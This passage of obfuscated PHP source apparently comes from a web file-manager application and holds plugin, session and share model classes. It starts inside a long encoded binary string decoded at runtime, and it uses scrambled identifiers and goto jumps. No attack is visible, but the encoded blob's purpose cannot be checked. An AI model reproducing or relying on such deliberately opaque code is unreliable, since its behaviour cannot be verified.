f\x21\x42\x91\x52\x4e\x44\x24\xc1\x37\x39\x54\xf2\x4c\x87\x87\x24\xec\xa3\xd8\xb5\x80\x99\xdf\x25\x6c\xbf\x2f\x5f\x63\xd2\x87\x53\x68\x98\x9d\x76\x78\x97\x9\xed\xad\xb4".strrev('×rr¦ñ9´oºAÁE–T$·Øë3\\°—Â{'."\n".'òá×\'â$Òt9ì†Ø{nXG·…')."\200\234\54\303\44\100\56\64\13\276\101\101\106\110\234\133\5\60\207\325\314\217\265\306\356\24\21\277\356\276\226\56\73\272\11\67\63\246\231\355\323\212\330\64\176\300\146\252\124\225\42\156\347\34\161"."\55\255\313\175\356\46\162\154\224\110\154\247\173\5\15\301\151\225\252\11\12\105\266\240\202\104\3\111\133\50\105\152\205\253\167\102\141\57\147\103\54\251\143\25\44\42\354\264\41\131\202\303\16\356\202"."\x4\xd1\x8f\x76\x3e\x9d\x24\x71\x6e\x65\xc5\x44\xf7\x11\x83\xc7\x55\xb4\x59\x28\x89\xb9\xa\xe2\x9f\xe\xa6\x41\x76\xc\x14\x2d\xb0\x13\x78\x2d\xec\x17\xbd\xb\x19\xfd\x23\x7e\xcb\x80\xc\xca\xa4\xcf\x91\x54\x46\x30\x13"."\x8e\xc9\x75\x24\xca\xf3\x26\x68\x9c\xcf\xe9\x2b\x11\x6a\xe0\x9b\xee\x66\xe9\x58\x4b\xb\x59\x32\x6c\x1d\xd7\x27\xe5\x5a\x30\xe5\xb5\x39\x65\x91\xab\x60\xab\xe\xa7\xe4\x90\x39\x54\xf0\xd6\x79\x5d\x9\xf5\x5e\x57\x73\x86"."\105\57\150\134\213\106\356\14\65\272\302\162\254\30\226\34\61\111\41\271\153\43\27\363\336\362\72\222\345\277\174\171\137\266\104\53\123\14\336\51\41\55\305\41\31\36\214\362\164\26\115\302\72\103\251"."\x52\xae\x86\xd8\xb\x3a\xb\x71\xe1\x9a\xa4\x16\x9f\x94\x24\xd4\x6e\xce\x8c\x26\x4f\xf1\xc9\xe3\x92\x2f\xa7\x9d\xf7\x5e\x58\x5\x53\x5c\xf9\x26\xa2\xb1\xa0\xba\x34\x84\x7d\x5a\x85\x4e\xf\x76\xb1\x77\x25\xc\x93\x3c\xf4"."\xc6\x9a\xec\xea\x90\xfb\x89\x6f\x4c\xda\x4c\x8e\x59\x78\x89\x8a\x7\x11\xec\x5c\xa1\x85\x5f\x4a\x3b\x8d\xda\x25\x3\x3\xe6\xf9\x53\x16\xda\x3a\xb\x63\x33\x28\xe7\x72\x9c\x5f\xa9\x58\xd2\x2c\x5a\x65\x7\x7\x96\x89\x59".strrev('‚ÅŞ½J(~è^éñ^Q_ÉQ€°fæ²ıïMÔgºxœp=˜)O[IëQhòºK4Í",˜Æåi')."\40\327\341\225\52\66\144\122\317\175\225\362\20\342\306\155\7\206\211\127\5\335\257\11\72\137\17\154\224\304\313\364\265\105\307\263\243\145\263\26\61\133\4\137\343\312\303\164\143\342\134\54\6\20\167"."\362\330\161\27\166\33\212\115\173\374\4\13\341\66\140\271\232\123\231\126\30\26\272\10\171\31\41\303\345\247\150\370\202\135\34\211\26\143\271\110\231\237\135\247\41\237\124\237\34\267\250\140\314\41\37".base64_decode('A+0KOUm6fEKn1pTzZVmSSZLZQyfQgnRf7lRX4GbQZftvyQhL2aQWc6aPfrGfhpBw60iy6Q1hwA==')."\175\214\224\152\165\71\44\2\222\162\103\222\120\222\140\371\255\266\270\154\227\230\132\126\15\213\24\4\143\341\112\227\10\261\330\52\265\101\301\224\213\23\133\52\325\246\15\126\50\232\52\73\123\242\24"."\x5e\x94\x30\xf5\x92\x53\x2d\x61\x88\xa5\xf\xc9\x5f\x87\x72\xc2\xf0\xc9\x51\xb0\x3c\x55\x38\xdd\x92\xea\xbb\xce\xe2\x64\x98\x38\xad\xd2\xf0\x9\x25\x74\x56\x97\x9d\x7a\x71\xa4\x12\x49\xf4\x7d\x4d\xae\x9\x24\x9\x3a\xb0".base64_decode('5pRQEaJD4RI28UmnCzFejM8ZKkOsNr2OVNdRHQszGR/qygLxntR8RSmghAJ6Niw1Jys8TFghXg==')."\xf9\x23\x2\x2b\x9d\x20\x96\x64\xbb\x22\x83\x71\x3a\xa6\x3\xf8\xd2\xde\xc6\x7\x6\x25\x63\x72\xa6\xa3\x3b\x15\x50\x83\x1d\x4d\x64\x9\x72\x79\xa6\x99\xcd\xe2\x6b\xed\x9\xb2\xa9\x2e\xb6\xb4\x13\x97\x97\x10\x12\x3d\xda"."\x21\x72\xdc\x16\xb\x87\x26\xe6\x88\x78\x8a\xe6\x5\x9c\x59\xb4\xbc\xee\x82\x9b\x5c\xc1\xd\x53\x5a\xc3\xf1\x9c\xb5\x9c\x3e\x64\xd8\xc9\x8c\x24\x1b\x28\xcf\x2c\x4f\x2f\x96\x4d\x33\x74\xa0\xf2\x38\xdc\xbd\x65\xb3\xec\xd6"."\x84\x12\x8d\x94\xf5\x47\x52\xd3\x4a\x98\x15\xea\xd0\x1e\x55\xac\x46\xb3\x70\x4d\x71\x2c\x73\xd4\x9d\x0\x4\xb8\x2e\xcd\xc2\x75\xcb\xb2\x59\xe5\x32\xb8\x92\x7a\xb6\x56\xb2\x26\x18\x5e\x39\xf0\x40\xec\x99\xaa\x30\x60\x21"._kodDe('K4dBQX3C93h9Mr5e+lCz+40dyjXqMYXILR1blejUVW78IdTrIG8TovtGh3RkvXV4O3YQR9gWyxs=')."\375\233\120\31\115\350\152\225\157\126\42\257\202\272\30\270\16\163\371\44\253\220\55\353\236\125\326\116\213\125\244\157\226\123\203\314\225\356\170\321\200\222\44\32\51\352\253\144\343\145\256\100\51\132\102"."\14\143\326\30\200\342\222\211\321\24\307\366\126\312\17\344\115\276\145\246\204\166\66\357\110\131\3\316\165\220\57\111\17\372\124\64\162\362\140\261\131\271\110\52\313\136\252\220\315\303\350\211\337\264\215"."\xa4\xa4\xbe\x2a\x4c\x5c\xf8\xc8\xc\x71\x4\xce\xa\x99\xb6\xfb\xe6\x41\x8\xf1\x1c\x9a\x4f\x95\xc4\xf4\x38\x89\x6\x7d\xe2\x5a\x8e\xb6\x27\xf1\x68\x2\x41\x1c\x46\x88\x94\x33\x82\xb\x4b\xaa\xf3\xd0\x82\x15\x6e\xf8\x5d"."\67\271\167\240\234\4\315\216\233\105\333\103\365\361\13\344\267\331\264\155\241\52\304\156\101\320\71\0\263\3\36\111\43\16\205\304\45\67\356\24\271\53\45\70\114\357\61\160\20\264\57\260\334\51\256"."\323\134\102\364\34\21\174\53\313\43\261\362\113\331\66\376\244\312\200\231\352\63\207\231\247\150\204\71\22\114\44\347\230\340\120\122\322\331\43\236\161\54\77\315\361\303\323\222\136\162\203\342\5\337\305"."\53\13\375\216\352\364\155\157\256\147\377\145\55\300\355\201\150\202\276\53\107\244\305\140\370\30\117\304\313\262\72\3\361\370\322\150\254\225\76\103\127\226\115\152\111\312\220\145\131\235\355\321\310\104\171"."\301\216\100\50\134\226\207\365\46\43\252\160\67\116\263\102\235\244\227\104\235\140\242\136\204\132\26\213\236\260\213\314\60\74\115\56\46\101\272\315\53\144\314\374\104\363\310\32\210\153\314\241\243\174\261"."\245\347\204\217\172\321\210\123\350\46\137\176\131\354\5\34\36\160\276\35\355\122\122\166\52\347\60\314\205\146\261\176\144\4\276\24\53\100\52\176\313\217\23\0\176\236\20\152\72\76\207\206\220\224\116"."\26\11\241\72\322\332\225\167\167\162\23\314\145\161\44\173\152\105\150\126\270\225\224\25\240\160\256\0\16\356\346\251\354\61\236\225\146\237\70\302\301\331\16\34\35\0\270\45\215\130\32\166\144\333\132"."\77\23\225\72\164\137\250\4\35\23\5\41\333\376\77\124\255\365\210\237\305\0\0", 10, -8))); goto aæ‚„ÆÒæÍ; eØ…Ô‹Ò‹: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\160\x6c\165\x67\151\x6e\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\163\164\x61\x74\165\163", "\x72\145\x67\x69\x65\163\x74", "\143\157\156\x66\x69\x67"); public function loadList($½³ñŞ†Ë = false) { $Ü…µ²ÄÄ = array_to_keyvalue($this->listData(), $_SERVER[áäÒ½¯Ç][32]); if ($½³ñŞ†Ë) { return $Ü…µ²ÄÄ[$½³ñŞ†Ë]; } return $Ü…µ²ÄÄ; } public function init() { $»õ²¾Ç’ =& $_SERVER[áäÒ½¯Ç]; Hook::trigger($»õ²¾Ç’[2253]); $“şÚ¦èÀ = $this->loadPluginList(); foreach ($“şÚ¦èÀ as $„†ÀÅõ¬ => $Ô¤Ô÷İ•) { $ï›€è¤„ = $this->appAllow($„†ÀÅõ¬, $Ô¤Ô÷İ•); if (!$ï›€è¤„) { continue; } foreach ($Ô¤Ô÷İ•[$»õ²¾Ç’[2254]] as $ä¾ôËñ¥ => $ãáÊ¢ô) { Hook::bind($ä¾ôËñ¥, $ãáÊ¢ô); } } Hook::trigger($»õ²¾Ç’[2255]); Hook::trigger(ACTION); } public function appAllow($›Ó™×Ù·, $­ ÄòŠ, $Íè²£¸ = true) { $©™™¶ïÆ =& $_SERVER[áäÒ½¯Ç]; $§‡ıá£ª = PLUGIN_DIR . $›Ó™×Ù· . $©™™¶ïÆ[2256]; if (!is_array($­ ÄòŠ) || !is_array($­ ÄòŠ[$©™™¶ïÆ[2254]]) || $­ ÄòŠ[$©™™¶ïÆ[852]] != 1 || !is_file($§‡ıá£ª)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$©™™¶ïÆ[6]][$©™™¶ïÆ[2257]] || !$GLOBALS[$©™™¶ïÆ[6]][$©™™¶ïÆ[2258]]) { return !0; } $ƒÀ¡©‹Õ = explode($©™™¶ïÆ[50], strtolower($GLOBALS[$©™™¶ïÆ[6]][$©™™¶ïÆ[2258]])); return in_array(strtolower($›Ó™×Ù·), $ƒÀ¡©‹Õ) ? !1 : !0; } if ($Íè²£¸ && !Action($©™™¶ïÆ[2259])->checkAuth($›Ó™×Ù·)) { return !1; } return !0; } public function unInstall($‚ü—Ô—) { $›ºïèâå =& $_SERVER[áäÒ½¯Ç]; $ãø­‘Ì = $this->loadList($‚ü—Ô—); if (file_exists(PLUGIN_DIR . $‚ü—Ô—)) { Hook::apply($‚ü—Ô— . $›ºïèâå[2260]); } $this->remove($ãø­‘Ì[$›ºïèâå[492]]); } public function changeStatus($‰²¯òŸ–, $ÎáîØ‹Ì) { $¨ïŞËäê =& $_SERVER[áäÒ½¯Ç]; $Ù¡çÄ«‹ = $this->loadList($‰²¯òŸ–); if ($ÎáîØ‹Ì) { Hook::apply($‰²¯òŸ– . $¨ïŞËäê[2261]); } $this->update($Ù¡çÄ«‹[$¨ïŞËäê[492]], array($¨ïŞËäê[2262] => $ÎáîØ‹Ì)); } public function appRegist($‹¸’ôÉê, $¥¤§öæ³) { $ÓãÕœÑÒ =& $_SERVER[áäÒ½¯Ç]; $‹­ÕÒ´‡ = $this->loadList($‹¸’ôÉê); if ($‹­ÕÒ´‡) { $this->update($‹­ÕÒ´‡[$ÓãÕœÑÒ[492]], array($ÓãÕœÑÒ[2254] => $¥¤§öæ³)); } else { $ƒ¤İ‘å® = array($ÓãÕœÑÒ[32] => $‹¸’ôÉê, $ÓãÕœÑÒ[2254] => $¥¤§öæ³, $ÓãÕœÑÒ[852] => 0, $ÓãÕœÑÒ[6] => $this->getConfigDefault($‹¸’ôÉê)); $this->insert($ƒ¤İ‘å®); } } public function getConfigDefault($¡èö¤Å) { $ÛÖ•˜Ï› =& $_SERVER[áäÒ½¯Ç]; $»—Òò‹Š = array(); $´¤—¥Å = $this->getPackageJson($¡èö¤Å); if (!$´¤—¥Å && is_array($´¤—¥Å[$ÛÖ•˜Ï›[2263]])) { return $»—Òò‹Š; } foreach ($´¤—¥Å[$ÛÖ•˜Ï›[2263]] as $ê‹‡ÏıÈ => $ëÑÙÆ¾Ï) { if (!isset($ëÑÙÆ¾Ï[$ÛÖ•˜Ï›[460]]) || isset($»—Òò‹Š[$ê‹‡ÏıÈ])) { continue; } $»—Òò‹Š[$ê‹‡ÏıÈ] = $ëÑÙÆ¾Ï[$ÛÖ•˜Ï›[460]]; } return $»—Òò‹Š; } public function getPackageJson($«²ªÛ—ã) { return Hook::apply($«²ªÛ—ã . $_SERVER[áäÒ½¯Ç][2264]); } public function getConfig($‚ò¯Ïú°, $Ì‘Ø¾ñ = false) { $İŒ´Ò¦Ú =& $_SERVER[áäÒ½¯Ç]; $¤¯…”öñ = array(); $Îöœü÷ = $this->loadList($‚ò¯Ïú°); if ($Îöœü÷ && is_array($Îöœü÷[$İŒ´Ò¦Ú[6]])) { $¤¯…”öñ = $Îöœü÷[$İŒ´Ò¦Ú[6]]; } if (!$¤¯…”öñ || $Ì‘Ø¾ñ) { $¤¯…”öñ = $this->getConfigDefault($‚ò¯Ïú°); } return $¤¯…”öñ; } public function setConfig($ß¨äô°‚, $„‹·íü = false) { $´ ¾ÈÎâ =& $_SERVER[áäÒ½¯Ç]; $ñµÅ¿ã© = $this->loadList($ß¨äô°‚); if (!$ñµÅ¿ã©) { return !1; } $Î—ä¢ó­ = $ñµÅ¿ã©[$´ ¾ÈÎâ[6]]; if ($„‹·íü == !1) { $Î—ä¢ó­ = array(); $„‹·íü = $this->getConfigDefault($ß¨äô°‚); } foreach ($„‹·íü as $ñÉã÷Ñû => $ÁŠªš°) { $Î—ä¢ó­[$ñÉã÷Ñû] = is_string($ÁŠªš°) ? trim($ÁŠªš°) : $ÁŠªš°; } $this->update($ñµÅ¿ã©[$´ ¾ÈÎâ[492]], array($´ ¾ÈÎâ[6] => $Î—ä¢ó­)); } public function viewList() { $ÌüñŞâ =& $_SERVER[áäÒ½¯Ç]; $Ô‹™Ğìà = $this->loadList(); $this->pluginScan($Ô‹™Ğìà); $Ô‹™Ğìà = $this->loadPluginList(); $ÂúöÄğÚ = array(); foreach ($Ô‹™Ğìà as $èÉöÈÎ => $í×ã˜°÷) { $µïç¥Õö = $í×ã˜°÷; unset($í×ã˜°÷[$ÌüñŞâ[2254]], $í×ã˜°÷[$ÌüñŞâ[6]]); $¢¹‚ËÂ¥ = PLUGIN_DIR . $í×ã˜°÷[$ÌüñŞâ[32]] . $ÌüñŞâ[2256]; if (!is_file($¢¹‚ËÂ¥)) { continue; } $æÚÇñÔ = Hook::apply($í×ã˜°÷[$ÌüñŞâ[32]] . $ÌüñŞâ[2264]); if (!is_array($æÚÇñÔ)) { continue; } $ÂúöÄğÚ[$èÉöÈÎ] = array_merge($í×ã˜°÷, $æÚÇñÔ); if ($µïç¥Õö[$ÌüñŞâ[6]][$ÌüñŞâ[1840]] != $æÚÇñÔ[$ÌüñŞâ[1814]]) { Hook::apply($í×ã˜°÷[$ÌüñŞâ[32]] . $ÌüñŞâ[2261]); $µïç¥Õö[$ÌüñŞâ[6]][$ÌüñŞâ[1840]] = $æÚÇñÔ[$ÌüñŞâ[1814]]; $this->update($í×ã˜°÷[$ÌüñŞâ[492]], array($ÌüñŞâ[6] => $µïç¥Õö[$ÌüñŞâ[6]])); } } return $ÂúöÄğÚ; } private function loadPluginList() { $ÉãÍÖıØ =& $_SERVER[áäÒ½¯Ç]; $Íô®µ = $this->loadList(); if (strtolower(MOD) == $ÉãÍÖıØ[2265]) { return $Íô®µ; } $ÇÀÀ‡Âõ = Hook::trigger($ÉãÍÖıØ[2266], $Íô®µ); if ($Íô®µ && !$ÇÀÀ‡Âõ) { die; } return $ÇÀÀ‡Âõ ? $ÇÀÀ‡Âõ : $Íô®µ; } private function pluginScan($±£¡Ş™Š) { $¶»Š×ß =& $_SERVER[áäÒ½¯Ç]; recursion_dir(PLUGIN_DIR, $´ìÎ†¢›, $¬Ë’èİ, 0); foreach ($´ìÎ†¢› as $Š±³®œ¾) { $ˆç’º³¬ = get_path_this($Š±³®œ¾); if (isset($±£¡Ş™Š[$ˆç’º³¬]) || !file_exists($Š±³®œ¾ . $¶»Š×ß[2267]) || !file_exists($Š±³®œ¾ . $¶»Š×ß[2256])) { continue; } Hook::apply($ˆç’º³¬ . $¶»Š×ß[2261]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\163\x65\163\163\151\x6f\x6e"; public function get($³ßË•¹¹) { $Æ«œ“Œã =& $_SERVER[áäÒ½¯Ç]; $Ç«´¨· = $this->where(array($Æ«œ“Œã[2268] => $³ßË•¹¹))->find(); if (!is_array($Ç«´¨·)) { return !1; } return $Ç«´¨·[$Æ«œ“Œã[169]]; } public function set($˜¯èõöø, $Ë…»Œê¤, $½º¸Ñœ“ = 3600) { $õ“Ï¬ï± =& $_SERVER[áäÒ½¯Ç]; $ë© ¿É = array($õ“Ï¬ï±[2268] => $˜¯èõöø, $õ“Ï¬ï±[2171] => $Ë…»Œê¤, $õ“Ï¬ï±[2269] => $½º¸Ñœ“ + time()); if (Session::get($õ“Ï¬ï±[2270])) { $ë© ¿É[$õ“Ï¬ï±[1542]] = Session::get($õ“Ï¬ï±[2270]); } else { $ë© ¿É[$õ“Ï¬ï±[1542]] = 0; } if ($this->get($˜¯èõöø)) { return $this->where(array($õ“Ï¬ï±[2268] => $˜¯èõöø))->save($ë© ¿É); } else { return $this->add($ë© ¿É, array(), !0); } } public function remove($ ¸×Ù‹©) { return $this->where(array($_SERVER[áäÒ½¯Ç][2268] => $ ¸×Ù‹©))->delete(); } public function clearTimeout() { return $this->where($_SERVER[áäÒ½¯Ç][2271] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\x65\162\x74\x2c\x75\160\x64\x61\164\x65", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\x63\162\x65\x61\164\x65\x54\x69\155\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\146\x75\156\143\164\151\x6f\156"), array("\157\160\164\x69\157\x6e\163", '', "\x69\x6e\163\145\x72\164\54\165\160\144\x61\164\145\54\163\x65\154\x65\x63\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÌÆÃ˜) { $üğ¢ÇÈ =& $_SERVER[áäÒ½¯Ç]; return array($üğ¢ÇÈ[2272] => array(USER_ID, $üğ¢ÇÈ[2273]), $üğ¢ÇÈ[2274] => array($ÌÆÃ˜[0], $üğ¢ÇÈ[2275])); } protected function ___listSimple() { $Å·Æ„ ± = $this->field($this->fieldList)->where(array($_SERVER[áäÒ½¯Ç][1542] => USER_ID))->select(); return $Å·Æ„ ± ? $Å·Æ„ ± : array(); } protected function ___getInfoShare($äÔÊ§¸¢) { return $this->_getShareInfo(array($_SERVER[áäÒ½¯Ç][693] => $äÔÊ§¸¢), !1); } protected function getInfo($©˜˜À°º) { $µ´ä¨Û = $this->getInfoShare($©˜˜À°º); return $this->shareSourceInfo($µ´ä¨Û); } public function getInfoByHash($ÆÛéŞú) { return $this->_getShareInfo(array($_SERVER[áäÒ½¯Ç][1504] => $ÆÛéŞú)); } public function getInfoByPath($Ó´Ì¬í™) { $”„±İ²à =& $_SERVER[áäÒ½¯Ç]; $éá¹Š¦ = array($”„±İ²à[1542] => USER_ID, $”„±İ²à[192] => $Ó´Ì¬í™); return $this->_getShareInfo($éá¹Š¦); } public function getInfoBySourcePath($Øî«ïìñ) { $’ıÂ¬ô„ =& $_SERVER[áäÒ½¯Ç]; $§ëÀÑß = array($’ıÂ¬ô„[1542] => USER_ID, $’ıÂ¬ô„[588] => $Øî«ïìñ); return $this->_getShareInfo($§ëÀÑß); } private function _getShareInfo($²©×ßĞ, $¦¦§Ì ¨ = true) { $„ûò¡»¤ =& $_SERVER[áäÒ½¯Ç]; $×¿…„ª = $this->where($²©×ßĞ)->find(); if (!$×¿…„ª) { return !1; } if (!is_array($×¿…„ª[$„ûò¡»¤[585]])) { $×¿…„ª[$„ûò¡»¤[585]] = array(); } $²©×ßĞ = array($„ûò¡»¤[693] => $×¿…„ª[$„ûò¡»¤[693]]); $¤éí‡› = $„ûò¡»¤[2276]; $×¿…„ª[$„ûò¡»¤[1500]] = Model($„ûò¡»¤[694])->order($„ûò¡»¤[492])->field($¤éí‡›)->where($²©×ßĞ)->select(); if (!$¦¦§Ì ¨) { return $×¿…„ª; } return $this->shareSourceInfo($×¿…„ª); } private function shareSourceInfo($ë®éšü) { $Â—Ç¿ÆÅ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($ë®éšü)) { return $ë®éšü; } if ($ë®éšü[$Â—Ç¿ÆÅ[192]] == $Â—Ç¿ÆÅ[239]) { $ë®éšü[$Â—Ç¿ÆÅ[90]] = IO::info($ë®éšü[$Â—Ç¿ÆÅ[588]]); } else { $ë®éšü[$Â—Ç¿ÆÅ[90]] = Model($Â—Ç¿ÆÅ[1482])->pathInfo($ë®éšü[$Â—Ç¿ÆÅ[192]]); } return $ë®éšü; } protected function getInfoAuth($ëû­»‹Ã) { $”“ğ£€ =& $_SERVER[áäÒ½¯Ç]; $¬ÃâÕğ‹ = $this->getInfo($ëû­»‹Ã); if ($¬ÃâÕğ‹[$”“ğ£€[1542]] == USER_ID) { $¬ÃâÕğ‹[$”“ğ£€[507]] = $¬ÃâÕğ‹[$”“ğ£€[90]][$”“ğ£€[507]]; } else { $¬ÃâÕğ‹[$”“ğ£€[507]] = Model($”“ğ£€[592])->authMake($¬ÃâÕğ‹[$”“ğ£€[1500]]); } return $¬ÃâÕğ‹; } protected function listData($¯œÅğÓ¿ = null, $Øˆ²¶÷ = 300) { $Å•ÊšŠˆ =& $_SERVER[áäÒ½¯Ç]; $ñõåû±° = array(array($Å•ÊšŠˆ[583] => array($Å•ÊšŠˆ[1128], 0), $Å•ÊšŠˆ[691] => array($Å•ÊšŠˆ[1128], 0), $Å•ÊšŠˆ[2277] => $Å•ÊšŠˆ[2233])); if ($¯œÅğÓ¿ == $Å•ÊšŠˆ[2278]) { $ñõåû±° = array($Å•ÊšŠˆ[583] => 1); } else { if ($¯œÅğÓ¿ == $Å•ÊšŠˆ[1293]) { $ñõåû±° = array($Å•ÊšŠˆ[691] => 1); } } $ñõåû±°[$Å•ÊšŠˆ[1542]] = USER_ID; $ÁÇ¾ñĞÉ = $this->where($ñõåû±°)->selectPage($Øˆ²¶÷); return $ÁÇ¾ñĞÉ; } protected function listToMe($ö£µ‘ø = 300) { $ÌÂà¨øô =& $_SERVER[áäÒ½¯Ç]; $ó€øªƒò = Model($ÌÂà¨øô[2279])->userGroupParents(USER_ID); $ª¯÷àí± = array($ÌÂà¨øô[676] => SourceModel::TYPE_USER, $ÌÂà¨øô[594] => USER_ID); if ($ó€øªƒò) { $ª¯÷àí± = array(array($ÌÂà¨øô[676] => SourceModel::TYPE_USER, $ÌÂà¨øô[594] => USER_ID), array($ÌÂà¨øô[676] => SourceModel::TYPE_GROUP, $ÌÂà¨øô[594] => array($ÌÂà¨øô[7], $ó€øªƒò)), $ÌÂà¨øô[2277] => $ÌÂà¨øô[2233]); } $•¹Ï¾»ë = Model($ÌÂà¨øô[694])->where($ª¯÷àí±)->selectPage($ö£µ‘ø); $¦‹‚•¹Ó = array_to_keyvalue_group($•¹Ï¾»ë[$ÌÂà¨øô[455]], $ÌÂà¨øô[693]); if (!$¦‹‚•¹Ó) { return $•¹Ï¾»ë; } $ÚÇÖËÓá = $ÌÂà¨øô[2280]; $ª¯÷àí± = array($ÌÂà¨øô[693] => array($ÌÂà¨øô[512], array_keys($¦‹‚•¹Ó))); $à¤€û³ = $this->field($ÚÇÖËÓá)->where($ª¯÷àí±)->select(); foreach ($à¤€û³ as $õ™ÂìüÇ => &$‚Š‹‚Ó¸) { $‚Š‹‚Ó¸[$ÌÂà¨øô[1500]] = $¦‹‚•¹Ó[$‚Š‹‚Ó¸[$ÌÂà¨øô[693]]]; } unset($‚Š‹‚Ó¸); $Âã–Ë¯ø = array($ÌÂà¨øô[2281] => $à¤€û³, $ÌÂà¨øô[2282] => $•¹Ï¾»ë[$ÌÂà¨øô[452]]); return $Âã–Ë¯ø; } protected function shareAdd($˜Éş¸Úœ, $ê”Ğ”Óµ) { $¦İ­¸Ú =& $_SERVER[áäÒ½¯Ç]; $Ç×åú© = $this->_addShareData($˜Éş¸Úœ, $ê”Ğ”Óµ); if (!empty($ê”Ğ”Óµ[$¦İ­¸Ú[2283]])) { $this->_shareAuthSet($Ç×åú©, $ê”Ğ”Óµ[$¦İ­¸Ú[2283]]); } $this->shareEventAdd($˜Éş¸Úœ, $ê”Ğ”Óµ, $¦İ­¸Ú[2284]); return $Ç×åú©; } protected function shareAddSystem($ºØ“Š€á, $—İ»¹‰î) { $ÎÖéÛ†ş =& $_SERVER[áäÒ½¯Ç]; $î˜‘í³à = $this->_addShareData($ºØ“Š€á, $—İ»¹‰î, $ÎÖéÛ†ş[190]); $this->_shareAuthSet($î˜‘í³à, $—İ»¹‰î[$ÎÖéÛ†ş[2283]]); return $î˜‘í³à; } private function shareEventAdd($‚Ó°Éì, $çƒ¢“Â, $’·„Æ†­ = "\141\x64\144") { $—î‡¹ =& $_SERVER[áäÒ½¯Ç]; if (!$‚Ó°Éì || $‚Ó°Éì == $—î‡¹[239]) { return; } if ($’·„Æ†­ == $—î‡¹[2284]) { if ($çƒ¢“Â[$—î‡¹[583]] == $—î‡¹[91]) { Model($—î‡¹[661])->eventShare($‚Ó°Éì, $—î‡¹[2285]); } if ($çƒ¢“Â[$—î‡¹[691]] == $—î‡¹[91]) { Model($—î‡¹[661])->eventShare($‚Ó°Éì, $—î‡¹[2286]); } return; } $éóÔèØ = $this->getInfoByPath($‚Ó°Éì); $½ç ¶õè = $—î‡¹[2287]; if ($éóÔèØ[$—î‡¹[583]] == $—î‡¹[239] && $çƒ¢“Â[$—î‡¹[583]] == $—î‡¹[91]) { $½ç ¶õè = $—î‡¹[2285]; } if ($éóÔèØ[$—î‡¹[583]] == $—î‡¹[91] && $çƒ¢“Â[$—î‡¹[583]] == $—î‡¹[239]) { $½ç ¶õè = $—î‡¹[2288]; } if ($éóÔèØ[$—î‡¹[691]] == $—î‡¹[239] && $çƒ¢“Â[$—î‡¹[691]] == $—î‡¹[91]) { $½ç ¶õè = $—î‡¹[2286]; } if ($éóÔèØ[$—î‡¹[691]] == $—î‡¹[91] && $çƒ¢“Â[$—î‡¹[691]] == $—î‡¹[239]) { $½ç ¶õè = $—î‡¹[2289]; } Model($—î‡¹[661])->eventShare($‚Ó°Éì, $½ç ¶õè); return; } private function _addShareData($ô¦“ŸÂ™, $ñÍşÁ˜‰ = array(), $†àºŸâó = false) { $óâÜ€åº =& $_SERVER[áäÒ½¯Ç]; $è©ˆ´»˜ = $†àºŸâó == $óâÜ€åº[190] ? 0 : USER_ID; $ÃƒïŸ¸Ñ = array($óâÜ€åº[511] => $ô¦“ŸÂ™, $óâÜ€åº[1918] => $è©ˆ´»˜); if ($ô¦“ŸÂ™ == 0) { $ÃƒïŸ¸Ñ = array($óâÜ€åº[2290] => $ñÍşÁ˜‰[$óâÜ€åº[588]], $óâÜ€åº[1918] => $è©ˆ´»˜); } if ($ÅéÜñ² = $this->where($ÃƒïŸ¸Ñ)->find()) { return $ÅéÜñ²[$óâÜ€åº[693]]; } if ($ô¦“ŸÂ™ == 0) { $˜­­£ = array($óâÜ€åº[32] => get_path_this($ñÍşÁ˜‰[$óâÜ€åº[87]])); } else { $˜­­£ = Model($óâÜ€åº[935])->sourceInfo($ô¦“ŸÂ™); if (!$˜­­£) { return !1; } } if (!$ñÍşÁ˜‰[$óâÜ€åº[1815]]) { $ñÍşÁ˜‰[$óâÜ€åº[1815]] = $˜­­£[$óâÜ€åº[32]]; } $ı½¢—–¤ = array($óâÜ€åº[1918] => $è©ˆ´»˜, $óâÜ€åº[511] => $ô¦“ŸÂ™, $óâÜ€åº[1815] => $óâÜ€åº[12], $óâÜ€åº[583] => 0, $óâÜ€åº[691] => 0, $óâÜ€åº[588] => $óâÜ€åº[12], $óâÜ€åº[392] => $óâÜ€åº[12], $óâÜ€åº[1002] => $óâÜ€åº[12], $óâÜ€åº[2291] => 0, $óâÜ€åº[2292] => 0, $óâÜ€åº[864] => 0, $óâÜ€åº[585] => $óâÜ€åº[12], $óâÜ€åº[1504] => $óâÜ€åº[12]); $õŞ¹Ëú = explode($óâÜ€åº[50], $óâÜ€åº[2293]); foreach ($õŞ¹Ëú as $Ä©Ÿû) { if (!isset($ñÍşÁ˜‰[$Ä©Ÿû])) { continue; } $ı½¢—–¤[$Ä©Ÿû] = $ñÍşÁ˜‰[$Ä©Ÿû]; } $ûŒú¶ö… = $this->add($ı½¢—–¤); $ôŒ˜öİ = array($óâÜ€åº[1504] => short_id($ûŒú¶ö…)); if ($this->where($ôŒ˜öİ)->find()) { $ôŒ˜öİ[$óâÜ€åº[1504]] .= $óâÜ€åº[482] . rand_string(2, 3); } $this->where(array($óâÜ€åº[2294] => $ûŒú¶ö…))->save($ôŒ˜öİ); return $ûŒú¶ö…; } private function _shareAuthSet($üêÙˆïË, $´ßšÀòİ) { $Ä£Å¥µ¥ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($´ßšÀòİ)) { return !1; } $ÄØ§ÄğÂ = Model($Ä£Å¥µ¥[2242]); $ÄØ§ÄğÂ->where(array($Ä£Å¥µ¥[693] => $üêÙˆïË))->delete(); $ËÒÌŞ§ = array(); foreach ($´ßšÀòİ as $ÌÌÛ»×Ì) { $•×ÒÎâ¸ = SourceModel::TYPE_USER; if ($ÌÌÛ»×Ì[$Ä£Å¥µ¥[189]] == SourceModel::TYPE_GROUP) { $•×ÒÎâ¸ = SourceModel::TYPE_GROUP; } $‰éÛ¢Ô„ = array($Ä£Å¥µ¥[693] => $üêÙˆïË, 